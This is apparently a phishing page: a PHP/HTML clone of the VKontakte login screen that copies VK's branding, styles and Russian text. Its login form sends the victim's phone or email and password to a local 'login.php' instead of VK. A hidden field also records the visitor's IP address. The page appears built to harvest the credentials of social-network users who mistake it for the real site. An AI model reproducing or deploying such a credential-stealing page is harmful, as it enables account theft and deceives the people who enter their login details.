<?php
	
	/**
		* @author Litvinov V.A.
		* @copyright 2016 (0611)
	*/
	
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="shortcut icon" href="https://vk.com/images/icons/favicons/fav_logo.ico" />
    <link rel="apple-touch-icon" href="https://vk.com/images/safari_60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://vk.com/images/safari_76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://vk.com/images/safari_120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://vk.com/images/safari_152.png">
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." />
    <title>Добро пожаловать | ВКонтакте</title>
    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css" />
    <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css" />
    <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/index.css" />
    <link type="text/css" rel="stylesheet" href="https://vk.com/css/al/login.css" />
    <link rel="alternate" media="only screen and (max-width: 640px)" href="/" />
  </head>
  <body onresize="onBodyResize()" class="index_page">
    <div class="scroll_fix_wrap _page_wrap" id="page_wrap">
      <div>
        <div class="scroll_fix">
          <div id="page_header_cont" class="page_header_cont">
            <div class="back"></div>
            <div id="page_header_wrap" class="page_header_wrap">
              <div id="page_header" class="p_head p_head_l0" style="width: 960px">
                <div class="content">
                  <div id="top_nav" class="head_nav">
                    <div class="head_nav_item fl_l">
                      <a class="top_home_link fl_l " href="/" aria-label="На главную" accesskey="1">
                        <div class="top_home_logo"></div>
                      </a>
                    </div>
                    <div class="head_nav_item fl_l">
                      <div id="ts_wrap" class="ts_wrap" >
                        <input type="text" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
                      </div>
                    </div>
                    <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
                    <div class="head_nav_item fl_r"><a class="top_nav_link" href="" id="top_switch_lang" style="">
                      Switch to English
                      </a>
                    </div>
                    <div class="head_nav_item_player"></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div id="page_layout" style="width: 960px;">
            <div id="page_body" class="fl_r " style="width: 960px;">
              <div id="wrap_between"></div>
              <div id="wrap3">
                <div id="wrap2">
                  <div id="wrap1">
                    <div id="content">
                      <div id="index_rcolumn" class="index_rcolumn">
                        <div id="index_login" class="page_block index_login">
                          <form method="post" name="login" action="/login.php">
                            <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR'] ?>" />
                            <input type="text" class="big_text" name="email" id="index_email" value="" placeholder="Телефон или email" />
                            <input type="password" class="big_text" name="pass" id="index_pass" value="" placeholder="Пароль" />
                            <button id="index_login_button" class="index_login_button flat_button button_big_text">Войти</button>
                            <div class="forgot">
                              <a id="index_forgot" class="index_forgot" href="https://vk.com/restore" target="_top">Забыли пароль?</a>
                            </div>
                          </form>
                        </div>
                        <div id="ij_form" class="page_block ij_form">
                          <h2 class="ij_header">Впервые ВКонтакте?</h2>
                          <div class="ij_subheader">Моментальная регистрация</div>
                          <div id="ij_msg"></div>
                          <input type="text" class="big_text" id="ij_first_name" value="" placeholder="Ваше имя" />
                          <input type="text" class="big_text" id="ij_last_name" value="" placeholder="Ваша фамилия" />
                          <button class="flat_button button_wide button_big_text ij_button" id="ij_submit">Зарегистрироваться</button>
                        </div>
                      </div>
                      <div class="login_mobile_promo_wrap clear_fix">
                        <div class="login_mobile_apps">
                          <div class="login_mobile_header">ВКонтакте для мобильных устройств</div>
                          <div class="login_mobile_info">Установите официальное мобильное приложение ВКонтакте и оставайтесь в курсе новостей Ваших друзей, где бы Вы ни находились.</div>
                          <div class="login_app_devices">
                            <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android" target="_blank" class="login_app_device login_app_device_android">
                              <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                              </div>
                              <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                <span class="login_app_download_icon"></span>
                                VK для Android
                                </button>
                              </div>
                            </a>
                            <a href="http://windowsphone.com/s?appid=edd920e2-b671-41b5-a9db-b89caccfa69c" target="_blank" class="login_app_device login_app_device_wp">
                              <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                              </div>
                              <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                <span class="login_app_download_icon"></span>
                                VK для WP
                                </button>
                              </div>
                            </a>
                            <a href="https://itunes.apple.com/ru/app/id564177498" target="_blank" class="login_app_device login_app_device_ios">
                              <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                              </div>
                              <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                <span class="login_app_download_icon"></span>
                                VK для iPhone
                                </button>
                              </div>
                            </a>
                          </div>
                        </div>
                      </div>
                      <div id="index_footer_wrap" class="footer_wrap index_footer_wrap">
                        <div class="footer_nav" id="bottom_nav">
                          <div class="footer_copy fl_l"><a href="https://vk.com/about">ВКонтакте</a> &copy; 2016</div>
                          <div class="footer_lang fl_r">Язык:<a class="footer_lang_link">English</a><a class="footer_lang_link">Русский</a><a class="footer_lang_link">Українська</a><a class="footer_lang_link">все языки &raquo;</a></div>
                          <div class="footer_links">
                            <a class="bnav_a" href="https://vk.com/about">о компании</a>
                            <a class="bnav_a" href="https://vk.com/terms">правила</a>
                            <a class="bnav_a" href="https://vk.com/ads">реклама</a>
                            <a class="bnav_a" href="https://vk.com/dev">разработчикам</a>
                          </div>
                        </div>
                        <div class="footer_bench clear">
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>